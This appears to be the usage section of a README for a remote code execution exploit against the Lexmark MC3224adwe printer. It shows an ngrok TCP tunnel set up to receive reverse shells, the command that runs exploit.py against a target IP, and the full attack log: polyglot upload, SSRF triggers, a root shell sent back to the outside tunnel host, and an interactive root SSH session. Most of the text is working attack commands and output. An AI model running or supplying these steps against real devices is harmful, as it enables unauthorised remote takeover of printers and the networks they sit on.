# Usage

Port forwarding:

```sh
$ ngrok tcp 4444

Session Status                online
Account                       bocchi (Plan: Free)
Version                       3.23.0
Region                        Japan (jp)
Latency                       204ms
Web Interface                 http://127.0.0.1:4040
Forwarding                    tcp://0.tcp.jp.ngrok.io:13374 -> localhost:4444
```

Exploit:

```sh
$ ./exploit.py http://2.21.200.7 0.tcp.jp.ngrok.io:13374:4444

      $$$ Lexmark MC3224adwe RCE Exploit $$$
          -- by blasty <peter@haxx.in> --

<15:19:28> [i] HACK: attacking 2.21.200.7, sending shells to 0.tcp.jp.ngrok.io
<15:19:28> [~] UPLOAD: upload lpe polyglot
<15:19:28> [~] COPY: copy polyglot to /tmp and pipe
<15:19:28> [~] SSRF: trigger part 1
<15:19:29> [~] SSRF: trigger part 2
<15:19:34> [~] WAIT: patience you must have, my young padawan
<15:19:43> [i] CLOCK: 15 seconds elapsed..
<15:19:58> [i] CLOCK: 30 seconds elapsed..
<15:20:13> [i] CLOCK: 45 seconds elapsed..
<15:20:28> [i] CLOCK: 60 seconds elapsed..
<15:20:36> [!] ROOT-SHELL: YES! Connection from: ('127.0.0.1', 41854)
<15:20:36> [!] ROOT-SHELL: id output: uid=0(root) gid=0(root)

<15:20:36> [i] HACK: pwning took 68 seconds!
<15:20:36> [!] HACK: we have 232 seconds left, phew!
<15:20:36> [?] HACK: lets see if our ssh daemon is alive..
<15:20:36> [*] HACK: (0) attempting to connect to ssh..
<15:20:37> [!] HACK: YES! ssh banner: SSH-2.0-OpenSSH_8.2

<15:20:37> [!] HACK: spawning flair and interactive ssh shell..
Warning: Permanently added '2.21.200.7' (ED25519) to the list of known hosts.
<15:20:43> [i] CLOCK: 75 seconds elapsed..

root@S0106788c77ce0712:~# id
uid=0(root) gid=0(root) groups=0(root)
root@S0106788c77ce0712:~# uname -a
Linux S0106788c77ce0712 5.4.90-yocto-standard #1 SMP PREEMPT Wed Aug 24 20:07:22 UTC 2022 armv7l GNU/Linux
```
